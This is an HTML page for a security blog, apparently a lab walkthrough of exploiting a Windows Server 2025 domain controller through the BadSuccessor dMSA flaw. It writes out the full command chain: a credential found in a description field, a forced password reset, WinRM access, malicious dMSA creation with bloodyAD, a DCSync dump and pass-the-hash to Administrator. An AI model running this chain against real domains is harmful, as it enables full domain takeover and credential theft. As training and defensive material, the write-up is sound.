@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Midgarden2 - BadSuccessor CVE-2025 dMSA Exploitation | Zerotrace Logs</title>
+  <meta name="description" content="HackSmarter Labs Midgarden2 walkthrough - exploiting Windows Server 2025 dMSA via BadSuccessor vulnerability for domain compromise. BloodHound, BloodyAD, and DCSync attack chain." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Midgarden2 - BadSuccessor CVE-2025 dMSA Exploitation" />
+  <meta property="og:description" content="HackSmarter Labs Midgarden2 walkthrough - exploiting Windows Server 2025 dMSA via BadSuccessor vulnerability for domain compromise. BloodHound, BloodyAD, and DCSync attack chain." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/midgarden2/administrator-shell.png" />
+  <meta property="og:url" content="https://z3rotrace.live/writeups/midgarden2-badsuccessor.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Midgarden2 - BadSuccessor CVE-2025 dMSA Exploitation" />
+  <meta name="twitter:description" content="HackSmarter Labs Midgarden2 walkthrough - exploiting Windows Server 2025 dMSA via BadSuccessor vulnerability for domain compromise." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/midgarden2/administrator-shell.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Page-specific styling for machine info box */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.35rem;
+    }
+
+    .machine-info li:last-child {
+      margin-bottom: 0;
+    }
+
+    /* Attack chain summary box */
+    .attack-chain {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.3);
+      border-radius: 8px;
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+    }
+
+    .attack-chain li {
+      margin-bottom: 0.5rem;
+    }
+
+    /* Key finding callout */
+    .key-finding {
+      background: rgba(255, 107, 107, 0.08);
+      border-left: 4px solid #ff6b6b;
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .key-finding strong {
+      color: #ff6b6b;
+    }
+
+    /* Tools list styling */
+    .tools-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 1rem 0;
+      padding: 0;
+    }
+
+    .tools-list li {
+      background: rgba(0, 170, 255, 0.1);
+      border: 1px solid rgba(0, 170, 255, 0.3);
+      padding: 0.4rem 0.8rem;
+      border-radius: 4px;
+      font-size: 0.9rem;
+      margin: 0;
+    }
+
+    .tools-list li::before {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">×</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="midgarden2-badsuccessor.html" aria-current="page">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector2.html">Machines Walkthroughs</a></li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Midgarden2 - BadSuccessor CVE-2025 dMSA Exploitation</h2>
+  <p><em>Published: January 2026 | HackSmarter Labs</em></p>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> HackSmarter Labs</li>
+      <li><strong>Difficulty:</strong> Hard</li>
+      <li><strong>OS:</strong> Windows Server 2025 (Domain Controller)</li>
+      <li><strong>Key Topics:</strong> BloodHound, BadSuccessor (CVE-2025), dMSA Exploitation, DCSync</li>
+    </ul>
+  </div>
+
+  <div class="disclaimer">
+    <strong>Disclaimer:</strong> This walkthrough documents techniques used during an authorized penetration testing engagement. The methods described should only be used in controlled lab environments or with explicit written authorization. Unauthorized access to computer systems is illegal.
+  </div>
+
+  <h2>Objective</h2>
+  <p>As a member of the Hack Smarter Red Team, the objective is to conduct a comprehensive penetration test of the client's internal environment. The client has a mature security posture with prior penetration testing experience. The goal is to identify overlooked attack vectors.</p>
+
+  <div class="key-finding">
+    <strong>Starting Credentials:</strong> <code>freyja:Fr3yja!Dr@g0n^12</code>
+  </div>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Credential Validation</h3>
+  <p>First, I validated the provided credentials using NetExec to confirm domain access:</p>
+  <pre><code>$ nxc smb 10.1.17.238 -u freyja -p 'Fr3yja!Dr@g0n^12'
+SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0n^12</code></pre>
+
+  <h3><span class="step">[Step 2]</span> Port Scan</h3>
+  <p>A comprehensive port scan revealed the target is a Windows Server 2025 Domain Controller:</p>
+  <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.1.17.238</code></pre>
+
+  <p><strong>Key findings from enumeration:</strong></p>
+  <ul>
+    <li>Domain: <code>yggdrasil.hacksmarter</code></li>
+    <li>DC: <code>MidgardDC.yggdrasil.hacksmarter</code></li>
+    <li><strong>Windows Server 2025</strong> - This is significant for the attack path</li>
+  </ul>
+
+  <div class="note">
+    <strong>Note:</strong> Windows Server 2025 introduces new features like delegated Managed Service Accounts (dMSAs), which as we will see, can be exploited using the BadSuccessor vulnerability.
+  </div>
+
+  <h2>Domain Enumeration</h2>
+
+  <h3><span class="step">[Step 3]</span> User Enumeration</h3>
+  <p>During user enumeration, I discovered a password stored in a user description field - a common misconfiguration:</p>
+  <pre><code>$ nxc smb 10.1.17.238 -u freyja -p 'Fr3yja!Dr@g0n^12' --users</code></pre>
+
+  <p><img src="../assets/midgarden2/thor-password-description.png" alt="Thor user has password in description field" loading="lazy"></p>
+
+  <div class="key-finding">
+    <strong>New credentials discovered:</strong> <code>Thor:Th0r!W!nt3rFang</code>
+  </div>
+
+  <h3><span class="step">[Step 4]</span> BloodHound Collection</h3>
+  <p>With Thor's credentials, I collected domain data for BloodHound analysis:</p>
+  <pre><code>$ nxc ldap 10.1.17.238 -u Thor -p 'Th0r!W!nt3rFang' --bloodhound --collection All</code></pre>
+
+  <h3><span class="step">[Step 5]</span> Attack Path Analysis</h3>
+  <p>BloodHound revealed a clear attack path. Thor has <strong>ForceChangePassword</strong> rights over the Hodr account:</p>
+
+  <p><img src="../assets/midgarden2/bloodhound-thor-hodr.png" alt="Thor can force change Hodr's password" loading="lazy"></p>
+
+  <p>Further analysis showed that Hodr is a member of <strong>Remote Management Users</strong>, enabling WinRM access to the Domain Controller:</p>
+
+  <p><img src="../assets/midgarden2/hodr-remote-management.png" alt="Hodr is member of Remote Management Users" loading="lazy"></p>
+
+  <h2>Lateral Movement</h2>
+
+  <h3><span class="step">[Step 6]</span> Password Reset</h3>
+  <p>Using Thor's ForceChangePassword privilege, I reset Hodr's password:</p>
+  <pre><code>$ net rpc password 'Hodr' 'Zerotrace123!' -U 'yggdrasil.hacksmarter'/'Thor'%'Th0r!W!nt3rFang' -S MidgardDC.yggdrasil.hacksmarter</code></pre>
+
+  <h3><span class="step">[Step 7]</span> WinRM Shell</h3>
+  <p>With the new password, I established a WinRM session as Hodr:</p>
+  <pre><code>$ evil-winrm -i 10.1.17.238 -u Hodr -p 'Zerotrace123!'
+
+*Evil-WinRM* PS C:\Users\Hodr.YGGDRASIL\Documents></code></pre>
+
+  <div class="key-finding">
+    <strong>User flag:</strong> <code>C:\Users\Hodr.YGGDRASIL\Desktop\user.txt</code>
+  </div>
+
+  <h2>Privilege Escalation: BadSuccessor Attack</h2>
+
+  <h3><span class="step">[Step 8]</span> dMSA Discovery</h3>
+  <p>Exploring the system, I found PowerShell scripts for dMSA management in <code>C:\scripts</code>:</p>
+  <pre><code>*Evil-WinRM* PS C:\scripts> .\dmsa_find.ps1
+
+[*] Retrieving all dMSAs from the domain...
+Name          : svc_iis_dMSA$
+Enabled       : True
+Delegation    : Legacy / Not Delegated</code></pre>
+
+  <div class="question">
+    <strong>What is a dMSA (Delegated Managed Service Account)?</strong>
+  </div>
+  <div class="answer">
+    <p>dMSAs are a new feature in Windows Server 2025 designed to replace legacy service accounts. They automatically rotate passwords and can inherit permissions from predecessor accounts during migration. This "inheritance" mechanism is the core of the BadSuccessor vulnerability.</p>
+  </div>
+
+  <h3><span class="step">[Step 9]</span> Understanding the BadSuccessor Vulnerability</h3>
+  <p>The BadSuccessor vulnerability (discovered by Akamai researcher Yuval Gordon in May 2025) exploits a critical flaw in dMSA migration:</p>
+
+  <ol>
+    <li>dMSAs have an attribute <code>msDS-ManagedAccountPrecededByLink</code> pointing to legacy accounts</li>
+    <li>The <code>msDS-DelegatedMSAState</code> attribute indicates migration status</li>
+    <li><strong>The KDC blindly trusts these attributes without validation</strong></li>
+    <li>Anyone who can create a dMSA or modify these attributes can impersonate ANY user</li>
+  </ol>
+
+  <p><strong>Attack Requirements:</strong></p>
+  <ul>
+    <li><code>CreateChild</code> permission on an OU</li>
+    <li>OR <code>GenericAll</code>/<code>WriteDACL</code> on an OU</li>
+    <li>OR <code>WriteProperty</code> on an existing dMSA</li>
+  </ul>
+
+  <h3><span class="step">[Step 10]</span> Finding Vulnerable OUs</h3>
+  <p>I enumerated OUs to find where we have the necessary permissions:</p>
+  <pre><code class="language-powershell">Import-Module ActiveDirectory
+
+$OUs = Get-ADOrganizationalUnit -Filter * -Properties nTSecurityDescriptor
+
+foreach ($OU in $OUs) {
+    $acl = Get-Acl "AD:$($OU.DistinguishedName)"
+    foreach ($ace in $acl.Access) {
+        if ($ace.ActiveDirectoryRights -match "CreateChild|GenericAll|WriteDACL|WriteOwner") {
+            if ($ace.IdentityReference -match "Hodr|webServerAdmins") {
+                Write-Host "[!] $($ace.IdentityReference) has $($ace.ActiveDirectoryRights) on $($OU.DistinguishedName)"
+            }
+        }
+    }
+}</code></pre>
+
+  <p><img src="../assets/midgarden2/webserveradmins-createchild.png" alt="webServerAdmins has CreateChild on Web Servers OU" loading="lazy"></p>
+
+  <p>The <code>webServerAdmins</code> group (which Hodr is a member of) has <strong>CreateChild</strong> permissions on the "Web Servers" OU - exactly what we need for the BadSuccessor attack.</p>
+
+  <h3><span class="step">[Step 11]</span> Automated Check with NetExec</h3>
+  <p>NetExec has a built-in module to check for BadSuccessor vulnerability:</p>
+  <pre><code>$ nxc ldap 10.1.17.238 -u Hodr -p 'Zerotrace123!' -M badsuccessor</code></pre>
+
+  <p><img src="../assets/midgarden2/netexec-badsuccessor.png" alt="NetExec confirms BadSuccessor vulnerability" loading="lazy"></p>
+
+  <h3><span class="step">[Step 12]</span> Exploitation with BloodyAD</h3>
+  <p>First, I installed BloodyAD for the exploitation:</p>
+  <pre><code>$ python3 -m venv .venv
+$ source .venv/bin/activate
+$ pip install bloodyad</code></pre>
+
+  <p>Then created a malicious dMSA that inherits Administrator privileges:</p>
+  <pre><code>$ bloodyAD -d yggdrasil.hacksmarter -u 'Hodr' -p 'Zerotrace123!' \
+    --host MIDGARDDC.yggdrasil.hacksmarter \
+    add badSuccessor evil_dmsa1 \
+    --ou 'OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter'</code></pre>
+
+  <p><img src="../assets/midgarden2/bloodyad-dmsa.png" alt="BloodyAD successfully creates malicious dMSA" loading="lazy"></p>
+
+  <p>The tool outputs a Kerberos ccache file with Administrator privileges, ready for immediate use.</p>
+
+  <h2>Post-Exploitation</h2>
+
+  <h3><span class="step">[Step 13]</span> Kerberos Configuration</h3>
+  <p>To use the obtained Kerberos ticket, I configured the local Kerberos environment:</p>
+  <pre><code>$ sudo apt install krb5-user</code></pre>
+
+  <p>Configure <code>/etc/krb5.conf</code>:</p>
+  <pre><code>[libdefaults]
+    default_realm = YGGDRASIL.HACKSMARTER
+    rdns = false
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    YGGDRASIL.HACKSMARTER = {
+        kdc = MIDGARDDC.yggdrasil.hacksmarter
+        admin_server = MIDGARDDC.yggdrasil.hacksmarter
+    }
+
+[domain_realm]
+    .yggdrasil.hacksmarter = YGGDRASIL.HACKSMARTER
+    yggdrasil.hacksmarter = YGGDRASIL.HACKSMARTER</code></pre>
+
+  <p>Update <code>/etc/hosts</code>:</p>
+  <pre><code>10.1.66.173     yggdrasil.hacksmarter MidgardDC MidgardDC.yggdrasil.hacksmarter</code></pre>
+
+  <h3><span class="step">[Step 14]</span> DCSync Attack</h3>
+  <p>With the malicious dMSA ticket, I performed a DCSync attack to dump all domain secrets:</p>
+  <pre><code>$ export KRB5CCNAME=evil_dmsa1_Pv.ccache
+
+$ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdrasil.hacksmarter</code></pre>
+
+  <div class="question">
+    <strong>What is DCSync?</strong>
+  </div>
+  <div class="answer">
+    <p>DCSync abuses domain replication protocols to request password hashes from a Domain Controller, effectively extracting the entire NTDS.dit database remotely. It requires <strong>Replicating Directory Changes (All)</strong> permissions, which domain controllers and certain privileged accounts possess. The malicious dMSA inherits these permissions from the Administrator account.</p>
+  </div>
+
+  <h2>Root Flag</h2>
+
+  <h3><span class="step">[Step 15]</span> Domain Admin Access</h3>
+  <p>Using the extracted Administrator NTLM hash, I established a privileged session:</p>
+  <pre><code>$ evil-winrm -i 10.1.17.238 -u Administrator -H '&lt;ntlm_hash&gt;'
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt</code></pre>
+
+  <p><img src="../assets/midgarden2/administrator-shell.png" alt="Administrator shell access" loading="lazy"></p>
+
+  <h2>Attack Chain Summary</h2>
+
+  <div class="attack-chain">
+    <ol>
+      <li><strong>Credential Discovery:</strong> Found Thor's password in user description field</li>
+      <li><strong>BloodHound Analysis:</strong> Identified Thor -> Hodr password reset path</li>
+      <li><strong>WinRM Access:</strong> Gained shell as Hodr via Remote Management Users</li>
+      <li><strong>BadSuccessor Exploitation:</strong> Created malicious dMSA with CreateChild permissions</li>
+      <li><strong>DCSync:</strong> Dumped domain secrets using inherited privileges</li>
+      <li><strong>Domain Admin:</strong> Full compromise achieved</li>
+    </ol>
+  </div>
+
+  <h2>Tools Used</h2>
+
+  <ul class="tools-list">
+    <li>NetExec (nxc)</li>
+    <li>BloodHound</li>
+    <li>Evil-WinRM</li>
+    <li>BloodyAD</li>
+    <li>Impacket secretsdump.py</li>
+  </ul>
+
+  <h2>Lessons Learned</h2>
+
+  <h3><span class="step defender">For Defenders</span></h3>
+  <ul>
+    <li><strong>Never store passwords in AD description fields</strong> - This is a common misconfiguration easily detected by attackers</li>
+    <li><strong>Audit ACLs on OUs</strong> - CreateChild permissions can enable devastating attacks like BadSuccessor</li>
+    <li><strong>Monitor dMSA creation</strong> - New dMSAs should trigger security alerts, especially if created by non-admin accounts</li>
+    <li><strong>Windows Server 2025 introduces new attack surfaces</strong> - Stay updated on emerging vulnerabilities like BadSuccessor</li>
+    <li><strong>Defense in depth</strong> - Multiple controls are needed to prevent privilege escalation chains</li>
+  </ul>
+
+  <h3><span class="step redteam">For Red Teamers</span></h3>
+  <ul>
+    <li>Always enumerate AD description fields for credentials</li>
+    <li>BloodHound remains essential for identifying attack paths</li>
+    <li>New Windows features often introduce new attack vectors</li>
+    <li>Stay current with CVE disclosures and tooling updates</li>
+  </ul>
+
+  <h2>References</h2>
+  <ul>
+    <li><a href="https://www.akamai.com/blog/security-research" target="_blank" rel="noopener">Akamai BadSuccessor Research</a></li>
+    <li><a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener">BloodyAD Documentation</a></li>
+  </ul>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
